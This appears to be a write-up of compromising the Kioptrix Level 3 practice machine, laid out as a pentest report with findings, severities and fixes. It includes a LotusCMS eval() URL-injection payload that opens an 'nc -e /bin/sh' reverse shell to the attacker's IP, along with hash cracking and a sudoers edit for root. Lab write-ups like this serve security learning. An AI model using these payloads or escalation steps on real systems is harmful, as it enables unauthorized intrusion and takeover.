**Vulnerable System**: Kioptrix 1.2 (Level 3)
=============================================

**Operating System**: Ubuntu 8.04

**Kernel**: 2.6.24

**Vulnerability Exploited**: LotusCMS 3.0 - 'eval()' Remote Command Execution

*Python Script Exploit*

**Exploit Used**: LotusCMS 3.0 PHP Code Execution

**Proof of Concept Code**:
<https://packetstormsecurity.com/files/122161/LotusCMS-3.0-PHP-Code-Execution.html>

*Manual Exploit*

**Exploit Used**: Manual Exploit Based on: LotusCMS 3.0 - 'eval()' Remote
Command Execution (Metasploit)

**Proof of Concept Code**:
http://kioptrix3.com/index.php?page=index%27)%3B%24{system(%27nc+-e+%2Fbin%2Fsh+\<ip
address\>+\<port number\>%27)}%3B%23

**Vulnerability Explained**: An attacker can exploit this vulnerability to
execute local commands through the webserver’s URL. This allowed the attacker to
gain remote access to and compromise the system.

**Vulnerability fix**: Currently no fixes or patches are available.

**Severity**: **Medium**

**Vulnerability Exploited:** Plaintext MySQL credentials found in configuration
file.

**Vulnerability Explained**: Plaintext credentials were found in configuration
file on the webserver. These credentials further granted access to MySQL
databases where other user credentials were found.

V**ulnerability Fix**: The user’s credentials in configuration files should be
hashed and the plaintext password stored in a secure location.

**Severity**: Low

**Vulnerability Exploited**: Weak Passwords, Reused passwords.

**Vulnerability Explained**: User passwords found in MySQL databases were easily
crackable via a dictionary attack.

**Vulnerability Fix**: Enforce strong password policy, use different passwords
for different applications.

**Severity**: Medium

**Privilege Escalation Vulnerability**: sudo access via HT editor

**Exploit Used**: N/A

**Proof of Concept Code**: N/A

**Privilege Escalation Vulnerability Explained:** loneferret’s account had sudo
privileges for executing HT editor. HT Editor was used to edit /etc/sudoers file
to grant privileged shell for user loneferret. This allowed the attacker to gain
administrative privileges and completely compromised the system.

**Vulnerability fix**: Follow the principal of the least privileges and only
grant as little privileges as needed to do the required job.

**Severity**: **High**

Methodology
-----------

-   Host Discovery (netdiscover)

-   Port Scanning (nmap)

-   Web Port Enumeration (nikto, gobuster, browser)

-   Discovered LotusCMS Code Execution Vulnerability (google)

-   Discovered LotusCMS Code Execution Vulnerability (searchsploit/exploit-db)

-   Low Privilege Shell Gained (netcat)

-   Privilege Escalation Enumeration (uname, cat /etc/\*-release, cat
    /etc/passwd)

-   Discovered MySQL Credentials (gconfig.php)

-   Discovered User Hashed passwords (MySQL)

-   Cracked MySQL hashes (Hashkiller)

-   Obtained SSH Shell (loneferret’s credentials)

-   Discovered Application Running with High Privileges (sudo -l)

-   Granted Higher Privileges to loneferret user (/etc/sudoers)

-   Obtained Administrative Privileges (sudo /bin/bash)

Netdiscover
-----------

Discovering the vulnerable system with netdiscover -r 192.168.20.0/24

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/netdiscover.png?raw=true)

Nmap
----

Nmap all ports scan:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/nmap.png?raw=true)

Nmap version, default script and aggressive scan:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/nmap%20sv.png?raw=true)

Port 80 Enumeration
-------------------

### Nikto

Scanning for web application vulnerabilities with Nikto

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/nikto.png?raw=true)

### Gobuster

Scanning for hidden web directories with GoBuster

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/gobuster.png?raw=true)

### Browser

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/browser.png?raw=true)

Discovering that the underlying software is LotusCMS

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/Discovering%20Lotus.png?raw=true)

Low Privilege Shell
-------------------

### Easy way (automated exploit)

Discovering a python exploit via google search:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/python%20exploit.png?raw=true)

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/python%20exploit2.png?raw=true)

Copying the exploit to the attacking system and running the exploit:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/copying%20exploit.png?raw=true)

Low Privilege shell:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/LowPrivilige%20shell.png?raw=true)

### Harder way (manual exploit)

Searching exploit-db for suitable exploit:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/exploit-db.png?raw=true)

Looking through the source code to see how the exploit works and how the payload
is crafted (notice variable stub and variable sploit):

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/Looking%20Through.png?raw=true)

From this we deducted that payload comes after ‘); and between \${payload}
characters.

We can now craft our own malicious payload via URL.

The payload is the following: ');\${system('nc -e /bin/sh 192.168.20.144
443')};\#

First the payload has to be url encoded:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/URL%20encoded.png?raw=true)

Next we append our encoded payload to the url after page=index.

<http://kioptrix3.com/index.php?page=index%27%29%3B%24%7Bsystem%28%27nc+-e+%2Fbin%2Fsh+192.168.20.144+443%27%29%7D%3B%23>

After starting netcat listener on port 443 the shell is obtained, and the shell
is upgraded to TTY shell via python:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/netcat.png?raw=true)

Privilege Escalation
--------------------

Enumerating operating system version and kernel version

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/enumerating%20operating.png?raw=true)

Enumerating users present on the system:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/Enumerating%20Users%20present.png?raw=true)

Enumerating web server directory for MySQL credentials:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/enumerating%20web%20server%20MYSQL.png?raw=true)

As per screenshot below, MySQL credentials for root have been discovered:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/mysql%20credentials.png?raw=true)

Enumerating MYSQL database:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/EnumeratingMySQL.png?raw=true)

Discovering credentials for users dreg and loneferret:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/dreg&ferret.png?raw=true)

Using Hashkiller to bruteforce the hashes found (john can be used, but for quick
unsalted hashes I find Hashkiller to be much quicker)

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/hashkiller.png?raw=true)

Logging into loneferret’s account and discovering his sudo priviliges:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/loneferret(sudo-l).png?raw=true)

After a quick google search it’s determined that HT is a hex editor available
for Linux (quick idea to escalate privilege is to edit /etc/sudoers file to add
additional privileges to loneferret’s account):

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/ht_google.png?raw=true)

From here SSH can be used to obtain a better shell:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/ssh.png?raw=true)

When trying to run the executable SSH session prints the following error:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/trying_to_run_ht.png?raw=true)

To overcome this issue, xterminal can be exported with the following command:

export TERM=xterm

Now when sudo ht is ran HT editor application opens:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/sudo_ht.png?raw=true)

By pressing F3, a file can be opened.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/F3.png?raw=true)

In this case since loneferret already has some sudo privilege, all there is to
do is add extra functionality. To make things easy /bin/bash has been added to
loneferret’s sudo privilege in /etc/sudoers file.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/etc_sudoers.png?raw=true)

By pressing F2 the file can be saved.

Once sudo /bin/bash command is executed the root privileges are gained.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/root.png?raw=true)

Congrats.txt:

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/congrats.png?raw=true)
